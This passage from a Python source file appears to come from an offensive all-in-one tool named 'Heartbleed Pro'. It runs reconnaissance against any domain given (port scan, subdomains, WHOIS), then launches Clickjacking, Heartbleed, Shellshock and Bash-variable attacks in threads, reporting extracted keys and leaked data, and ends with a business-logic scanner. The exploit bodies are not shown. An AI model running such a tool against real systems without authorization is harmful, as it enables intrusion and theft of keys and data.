        self.report_html = os.path.join(self.scan_dir, "bizlogic_report.html")
        
        # Text report
        with open(self.report_file, "w", encoding="utf-8") as f:
            f.write(f"BizLogic Scanner Report for {self.base_url}\n")
            f.write(f"Started: {self.start_time.isoformat()}\n")
            f.write(f"Pages collected: {len(self.pages)}\n")
            f.write("=" * 80 + "\n\n")
            
            if not self.findings:
                f.write("No heuristic findings detected.\n")
            else:
                for i, finding in enumerate(self.findings, 1):
                    f.write(f"{i}. [{finding.get('severity')}] {finding.get('title')}\n")
                    f.write(f"   URL: {finding.get('url')}\n")
                    if finding.get('parameter'):
                        f.write(f"   Parameter: {finding.get('parameter')}\n")
                    f.write(f"   Confidence: {finding.get('confidence')}\n")
                    f.write(f"   Evidence: {finding.get('evidence')}\n")
                    f.write(f"   Remediation: {finding.get('remediation')}\n")
                    f.write("-" * 80 + "\n")
                    
        # JSON report
        with open(self.report_json, "w", encoding="utf-8") as f:
            json.dump({
                "target": self.base_url,
                "started": self.start_time.isoformat(),
                "pages_collected": len(self.pages),
                "findings": self.findings,
                "exploitation_results": self.exploitation_results
            }, f, indent=2)
            
        print(f"\n{Colors.GREEN}[+] Business Logic reports saved to: {self.scan_dir}/{Colors.ENDC}")
        
    def run(self):
        """Run the business logic scanner"""
        print(f"\n{Colors.CYAN}[*] Business Logic Scanner initialized for: {self.base_url}{Colors.ENDC}")
        
        # Crawl the site
        print(f"{Colors.CYAN}[*] Crawling site (max 50 pages)...{Colors.ENDC}")
        self.crawl("/", max_pages=50)
        print(f"{Colors.GREEN}[+] Crawled {len(self.pages)} pages{Colors.ENDC}")
        
        # Run checks
        self.run_checks()
        
        # Generate report
        self.generate_report()
        
        return self.findings

# ─── MAIN ENGINE ──────────────────────────────────────────────────────────
class HeartbleedPro:
    """All‑in‑One Reconnaissance + Vulnerability Assessment + Business Logic Engine"""

    def __init__(self):
        self.results = {}
        self.start_time = datetime.now()
        self.recon = Reconnaissance()

    def run_reconnaissance(self, domain, protocol):
        """Run comprehensive reconnaissance"""
        url = protocol + domain
        
        print(f'\n{Colors.BOLD}{Colors.GREEN}[+] Starting Reconnaissance scan for: {url}{Colors.ENDC}')
        print(f'{Colors.BOLD}{Colors.YELLOW}[+] Running all recon modules...{Colors.ENDC}\n')
        
        # Basic Info
        self.recon.print_header('BASIC RECON')
        self.recon.print_result('Site Title', self.recon.get_title(url))
        ip = self.recon.get_ip(domain)
        self.recon.print_result('IP Address', ip)
        self.recon.print_result('Web Server', self.recon.get_server(url))
        self.recon.print_result('CMS', self.recon.detect_cms(url))
        self.recon.print_result('Cloudflare', self.recon.cloudflare_detect(domain))
        self.recon.print_result('Robots.txt', self.recon.robots_check(url))
        
        # WHOIS
        self.recon.print_header('WHOIS LOOKUP')
        print(f'{Colors.GREEN}{self.recon.whois_lookup(domain)}{Colors.ENDC}')
        
        # Geo-IP
        self.recon.print_header('GEO-IP LOOKUP')
        print(f'{Colors.GREEN}{self.recon.geo_ip(domain)}{Colors.ENDC}')
        
        # HTTP Headers
        self.recon.print_header('HTTP HEADERS')
        print(f'{Colors.GREEN}{self.recon.get_headers(url)}{Colors.ENDC}')
        
        # DNS Lookup
        self.recon.print_header('DNS LOOKUP')
        print(f'{Colors.GREEN}{self.recon.dns_lookup(domain)}{Colors.ENDC}')
        
        # Subnet Calculator
        self.recon.print_header('SUBNET CALCULATOR')
        print(f'{Colors.GREEN}{self.recon.subnet_calc(domain)}{Colors.ENDC}')
        
        # Nmap Scan
        self.recon.print_header('NMAP PORT SCAN')
        print(f'{Colors.GREEN}{self.recon.nmap_scan(domain)}{Colors.ENDC}')
        
        # Subdomain Scanner
        self.recon.print_header('SUBDOMAIN SCANNER')
        subdomains = self.recon.subdomain_scan(domain)
        if subdomains:
            print(f'{Colors.BOLD}{Colors.CYAN}[i] Total Subdomains Found: {Colors.GREEN}{len(subdomains)}{Colors.ENDC}\n')
            for sub in subdomains[:20]:
                print(f'{Colors.BOLD}{Colors.CYAN}[+] Subdomain:{Colors.ENDC} {Colors.GREEN}{sub["domain"]}{Colors.ENDC}')
                print(f'{Colors.BOLD}{Colors.CYAN}[-] IP:{Colors.ENDC} {Colors.GREEN}{sub["ip"]}{Colors.ENDC}\n')
        else:
            print(f'{Colors.RED}[!] No subdomains found{Colors.ENDC}')
        
        # Reverse IP Lookup
        self.recon.print_header('REVERSE IP LOOKUP')
        if ip != 'N/A':
            sites = self.recon.reverse_ip(ip)
            if sites:
                print(f'{Colors.BOLD}{Colors.CYAN}[i] Total Sites Found: {Colors.GREEN}{len(sites)}{Colors.ENDC}\n')
                for site in sites[:20]:
                    print(f'{Colors.BOLD}{Colors.CYAN}[+] {Colors.ENDC}{Colors.GREEN}{site}{Colors.ENDC}')
            else:
                print(f'{Colors.RED}[!] No sites found on this server{Colors.ENDC}')
        else:
            print(f'{Colors.RED}[!] Could not get IP address{Colors.ENDC}')
        
        # SQL Injection Scan
        self.recon.print_header('SQL VULNERABILITY SCAN')
        vuln_links = self.recon.sql_injection_scan(url)
        if vuln_links:
            vulnerable_count = sum(1 for v in vuln_links if v['vulnerable'])
            print(f'{Colors.BOLD}{Colors.CYAN}[i] URL(s) with parameters: {Colors.GREEN}{len(vuln_links)}{Colors.ENDC}')
            print(f'{Colors.BOLD}{Colors.CYAN}[i] Potentially vulnerable: {Colors.GREEN}{vulnerable_count}{Colors.ENDC}\n')
            
            for item in vuln_links[:10]:
                status = f'{Colors.GREEN}Vulnerable{Colors.ENDC}' if item['vulnerable'] else f'{Colors.RED}Not Vulnerable{Colors.ENDC}'
                print(f'{Colors.BOLD}{Colors.CYAN}[ LINK ]{Colors.ENDC} {Colors.GREEN}{item["url"]}{Colors.ENDC}')
                print(f'{Colors.BOLD}{Colors.CYAN}[ SQLi ]{Colors.ENDC} {status}\n')
        else:
            print(f'{Colors.RED}[!] No links with parameters found{Colors.ENDC}')
        
        # Blogger's View
        self.recon.print_header("BLOGGER'S VIEW")
        try:
            response = requests.get(url, timeout=10, verify=False)
            self.recon.print_result('HTTP Response Code', response.status_code)
        except:
            self.recon.print_result('HTTP Response Code', 'N/A')
        self.recon.print_result('Site Title', self.recon.get_title(url))
        self.recon.print_result('CMS', self.recon.detect_cms(url))
        self.recon.print_result('Alexa Global Rank', self.recon.alexa_rank(domain))
        
        # Social Media Links
        social = self.recon.social_links(url)
        if social:
            total = sum(len(links) for links in social.values())
            print(f'{Colors.BOLD}{Colors.CYAN}[i] Social Links Found: {Colors.GREEN}{total}{Colors.ENDC}\n')
            for platform, links in social.items():
                for link in links:
                    print(f'{Colors.BOLD}{Colors.CYAN}[{platform.upper():12}]{Colors.ENDC} {Colors.GREEN}{link}{Colors.ENDC}')
            print()
        else:
            print(f'{Colors.RED}[!] No social links found{Colors.ENDC}')
        
        # Link Count
        self.recon.print_result('Total Links Found', self.recon.count_links(url))
        
        # MX Lookup
        self.recon.print_header('MX LOOKUP')
        mx_records = self.recon.mx_lookup(domain)
        if mx_records:
            for mx in mx_records:
                print(f'{Colors.BOLD}{Colors.CYAN}[MX]{Colors.ENDC} {Colors.GREEN}{mx["domain"]}{Colors.ENDC}')
                print(f'{Colors.BOLD}{Colors.CYAN}[IP]{Colors.ENDC} {Colors.GREEN}{mx["ip"]}{Colors.ENDC}')
                print(f'{Colors.BOLD}{Colors.CYAN}[Priority]{Colors.ENDC} {Colors.GREEN}{mx["preference"]}{Colors.ENDC}\n')
        else:
            print(f'{Colors.RED}[!] No MX records found{Colors.ENDC}')
        
        print(f'\n{Colors.BOLD}{Colors.GREEN}[+] Reconnaissance scan complete!{Colors.ENDC}')
        return ip

    def run_vulnerability_assessment(self, target):
        """Run vulnerability assessment (Clickjacking, Heartbleed, Shellshock, Bash Variables)"""
        
        print(f'\n{Colors.BOLD}{Colors.MAGENTA}{"═" * 60}')
        print(f'{Colors.BOLD}{Colors.MAGENTA}  VULNERABILITY ASSESSMENT PHASE')
        print(f'{Colors.BOLD}{Colors.MAGENTA}{"═" * 60}{Colors.ENDC}')
        
        print(Colors.YELLOW + "  [*] Launching all vulnerability vectors simultaneously...\n" + Colors.ENDC)

        result_queue = queue.Queue()
        threads = []
        stop_loading = threading.Event()

        loading_thread = threading.Thread(target=loading_animation, args=(stop_loading,))
        loading_thread.daemon = True
        loading_thread.start()

        print(Colors.CYAN + "  ═══════ DEPLOYING ATTACK VECTORS ═══════" + Colors.ENDC)

        # 1. Clickjacking
        t1 = threading.Thread(target=ClickjackingAttack.attack, args=(target, result_queue))
        t1.daemon = True
        t1.start()
        threads.append(t1)

        # 2. Heartbleed
        t2 = threading.Thread(target=HeartbleedAttack.attack, args=(target, result_queue))
        t2.daemon = True
        t2.start()
        threads.append(t2)

        # 3. Shellshock
        t3 = threading.Thread(target=ShellshockAttack.attack, args=(target, result_queue))
        t3.daemon = True
        t3.start()
        threads.append(t3)

        # 4. Bash Variables
        t4 = threading.Thread(target=BashVariableAttack.attack, args=(target, result_queue))
        t4.daemon = True
        t4.start()
        threads.append(t4)

        completed = 0

        while completed < 4:
            try:
                module, status, message = result_queue.get(timeout=1)
                completed += 1

                self.results[module] = status

                if status == "VULNERABLE":
                    status_color = Colors.RED + Colors.BOLD
                    status_text = "VULNERABLE"
                    icon = "💀"
                elif status == "KEY_EXTRACTED":
                    status_color = Colors.GREEN + Colors.BOLD
                    status_text = "KEY EXTRACTED"
                    icon = "🔑"
                elif status == "DUMP_SAVED":
                    status_color = Colors.CYAN
                    status_text = "DUMP SAVED"
                    icon = "💾"
                elif status == "LEAKED_DATA":
                    status_color = Colors.YELLOW
                    status_text = "LEAKED DATA"
                    icon = "📄"
                elif status == "SECURE":
                    status_color = Colors.GREEN
                    status_text = "SECURE"
                    icon = "🛡️"
                else:
                    status_color = Colors.YELLOW
                    status_text = "ERROR"
                    icon = "⚠"

                print(f"\n  {Colors.CYAN}┌────────────────────────────────────────────────────────────┐{Colors.ENDC}")
                print(f"  {Colors.CYAN}│{Colors.ENDC} {Colors.MAGENTA}{icon} {module.upper():14}{Colors.ENDC} : {status_color}{status_text:16}{Colors.ENDC} {Colors.CYAN}│{Colors.ENDC}")
                if status == "LEAKED_DATA":
                    print(f"  {Colors.CYAN}│{Colors.ENDC} {Colors.WHITE}{'─' * 58}{Colors.ENDC} {Colors.CYAN}│{Colors.ENDC}")
                    for line in message.split('\n')[:5]:
                        if line.strip():
                            print(f"  {Colors.CYAN}│{Colors.ENDC} {Colors.DIM}{line[:56]:56}{Colors.ENDC} {Colors.CYAN}│{Colors.ENDC}")
                    if len(message.split('\n')) > 5:
                        print(f"  {Colors.CYAN}│{Colors.ENDC} {Colors.DIM}... (truncated, see dump file){Colors.ENDC} {Colors.CYAN}│{Colors.ENDC}")
                else:
                    print(f"  {Colors.CYAN}│{Colors.ENDC} {Colors.WHITE}{message[:56]:56}{Colors.ENDC} {Colors.CYAN}│{Colors.ENDC}")
                print(f"  {Colors.CYAN}└────────────────────────────────────────────────────────────┘{Colors.ENDC}")

            except:
                pass

        stop_loading.set()
        loading_thread.join(timeout=0.5)
        sys.stdout.write('\r' + ' ' * 50 + '\r')
        sys.stdout.flush()

        for t in threads:
            t.join(timeout=2)

        elapsed = datetime.now() - self.start_time
        print("\n" + Colors.MAGENTA + "  ══════════════════════════════════════════════════════════════════════════════" + Colors.ENDC)
        print(Colors.RED + "  █ VULNERABILITY SCAN COMPLETE" + Colors.ENDC)
        print(Colors.RED + f"  █ Time elapsed: {Colors.WHITE}{elapsed.total_seconds():.2f}s{Colors.ENDC}")
        print(Colors.MAGENTA + "  ══════════════════════════════════════════════════════════════════════════════" + Colors.ENDC)

        print("\n" + Colors.CYAN + "  ═══════ FINAL VERDICT ═══════" + Colors.ENDC)
        vulnerable_count = 0
        for module, status in self.results.items():
            if status == "VULNERABLE":
                status_text = Colors.RED + "VULNERABLE" + Colors.ENDC
                vulnerable_count += 1
            elif status == "KEY_EXTRACTED":
                status_text = Colors.GREEN + "KEY EXTRACTED" + Colors.ENDC
            elif status == "SECURE":
                status_text = Colors.GREEN + "SECURE" + Colors.ENDC
            else:
                status_text = Colors.YELLOW + "ERROR" + Colors.ENDC
            print(f"  {module:12} : {status_text}")

        print("\n" + Colors.MAGENTA + "  ══════════════════════════════════════════════════════════════════════════════" + Colors.ENDC)
        if vulnerable_count > 0:
            print(Colors.RED + Colors.BOLD + f"  💀 {vulnerable_count} CRITICAL VULNERABILITIES FOUND! TAKE ACTION NOW! 💀" + Colors.ENDC)
        else:
            print(Colors.GREEN + Colors.BOLD + "  🛡️ No critical vulnerabilities detected. Stay secure!" + Colors.ENDC)
        print(Colors.MAGENTA + "  ══════════════════════════════════════════════════════════════════════════════" + Colors.ENDC + "\n")

    def run_business_logic(self, base_url):
        """Run business logic scanner"""
        print(f'\n{Colors.BOLD}{Colors.MAGENTA}{"═" * 60}')
        print(f'{Colors.BOLD}{Colors.MAGENTA}  BUSINESS LOGIC SCANNER PHASE')
        print(f'{Colors.BOLD}{Colors.MAGENTA}{"═" * 60}{Colors.ENDC}')
        
        scanner = BizLogicScanner(base_url)
        findings = scanner.run()
        
        print(f"\n{Colors.GREEN}[+] Business Logic Scanner complete. {len(findings)} findings detected.{Colors.ENDC}")
        return findings

    def run(self, target):
        """Main run method - Reconnaissance first, then Vulnerability Assessment, then Business Logic"""
        
        # Clean domain
        target = target.replace("http://", "").replace("https://", "").split("/")[0]
        if ":" in target:
            target = target.split(":")[0]
        
        # Get protocol preference
        print(f'\n{Colors.BOLD}{Colors.CYAN}Enter 1 for HTTP or 2 for HTTPS (default: 2): {Colors.ENDC}', end='')
        protocol_choice = input().strip()
        protocol = 'https://' if protocol_choice != '1' else 'http://'
        base_url = protocol + target
        
        # Phase 1: Reconnaissance
        ip = self.run_reconnaissance(target, protocol)
        
        # Phase 2: Vulnerability Assessment
        self.run_vulnerability_assessment(target)
        
        # Phase 3: Business Logic Scanner
        self.run_business_logic(base_url)
        
        print(f'\n{Colors.BOLD}{Colors.GREEN}[+] FULL SCAN COMPLETE!{Colors.ENDC}')
        print(f'{Colors.BOLD}{Colors.YELLOW}Press Enter to exit...{Colors.ENDC}')
        input()

# ─── BANNER ──────────────────────────────────────────────────────────────
def banner():
    os.system('clear')
    print(Colors.RED + r"""
  _-_ _,,   ,,              |\
  /,              _          ||           -/  )  ||               \\
  || __    _-_   < \, ,._-_ =||=         ~||_<   ||  _-_   _-_   / \\
 ~||-  -  || \\  /-||  ||    ||           || \\  || || \\ || \\ || ||
  ||===|| ||/   (( ||  ||    ||           ,/--|| || ||/   ||/   || ||
 ( \_, |  \\,/   \/\\  \\,   \\,         _--_-'  \\ \\,/  \\,/   \\/
       `                                (


-__ /\
  ||  \
 /||__|| ,._-_  /'\
 \||__||  ||   || ||
  ||  |,  ||   || ||
_-||-_/   \\,  \\,/
  ||
╠═══════════════════════════════════════════════════════════════════════════════════════════════╣
║                         |  \ \ | |/ /                                                 ║
║                         |  |\ `' ' /                                                  ║
║                         |  ;'aorta \      / , pulmonary                               ║
║                         | ;    _,   |    / / ,  arteries                              ║
║              superior   | |   (  `-.;_,-' '-' ,                                       ║
║              vena cava  | `,   `-._       _,-'_                                       ║
║                         |,-`.    `.)    ,<_,-'_, pulmonary                            ║
║                        ,'    `.   /   ,'  `;-' _,  veins                              ║
║                       ;        `./   /`,    \-'                                       ║
║                       | right   /   |  ;\   |\                                        ║
║                       | atrium ;_,._|_,  `, ' \                                       ║
║                       |        \    \ `       `,                                      ║
║                       `      __ `    \   left  ;,                                     ║
║                        \   ,'  `      \,  ventricle                                   ║
║                         \_(            ;,      ;;                                     ║
║                         |  \           `;,     ;;                                     ║
║              inferior   |  |`.          `;;,   ;'                                     ║
║              vena cava  |  |  `-.        ;;;;,;' FL                                   ║
║                         |  |    |`-.._  ,;;;;;'                                       ║
║                         |  |    |   | ``';;;'                                         ║
║                         |  |    |   |  aorta                                          ║
╠═══════════════════════════════════════════════════════════════════════════════════════════════╣
║  █  Tool : Heartbleed Pro v1.0   █  Author : SYLHETYHACKVENGER (THE-ERROR808) & ek0ms          ║
║  █  Mode  : Reconnaissance + Vulnerability Assessment + Business Logic (ONE SHOT)              ║
║  █  Modules : Recon • Clickjacking • Heartbleed • Shellshock • Bash Variables • Business Logic ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════╝
    """ + Colors.ENDC)
    print(Colors.MAGENTA + "  ══════════════════════════════════════════════════════════════════════════════" + Colors.ENDC)
    print(Colors.RED + Colors.BLINK + "  ⚡ HEARTBLEED PRO - FULL RECON + VULNERABILITY + BUSINESS LOGIC ⚡" + Colors.ENDC)
    print(Colors.MAGENTA + "  ══════════════════════════════════════════════════════════════════════════════" + Colors.ENDC + "\n")

# ─── MAIN ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) < 2:
        banner()
        print(Colors.RED + "\n  ⚠ USAGE: python3 heartbleed_pro.py <domain>" + Colors.ENDC)
        print(Colors.CYAN + "  Example: python3 heartbleed_pro.py example.com" + Colors.ENDC)
        print(Colors.CYAN + "  Example: python3 heartbleed_pro.py 192.168.1.1" + Colors.ENDC)
        sys.exit(1)

    target = sys.argv[1]
    
    banner()

    # Run engine
    engine = HeartbleedPro()
    engine.run(target)
